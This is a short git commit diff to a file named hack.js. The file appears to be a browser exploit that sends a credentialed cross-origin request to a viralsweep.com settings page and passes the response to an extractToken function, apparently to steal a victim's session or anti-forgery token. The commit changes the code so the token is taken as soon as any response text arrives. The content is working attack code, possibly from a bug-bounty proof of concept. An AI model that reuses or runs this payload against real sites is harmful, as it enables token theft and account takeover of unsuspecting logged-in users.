265060664aadf4ab4c3d741ade1bcc36449ae3aa
hacky4594 <hacky4594@gmail.com>
2017-01-18 23:27:52 +0530

    Update hack.js

--- hack.js
+++ hack.js
@@ -6,8 +6,11 @@ http.open("GET","https://hack.viralsweep.com/settings",true);
 http.setRequestHeader('Content-Type','text/plain');
 http.withCredentials = "true";
 http.onreadystatechange = function(){
-	if(http.readystate == 4){
+	if(http.responseText!="")
+	{
 		extractToken(http.responseText);
+	}
+	if(http.readystate == 4){
 	}
 }
 http.send();
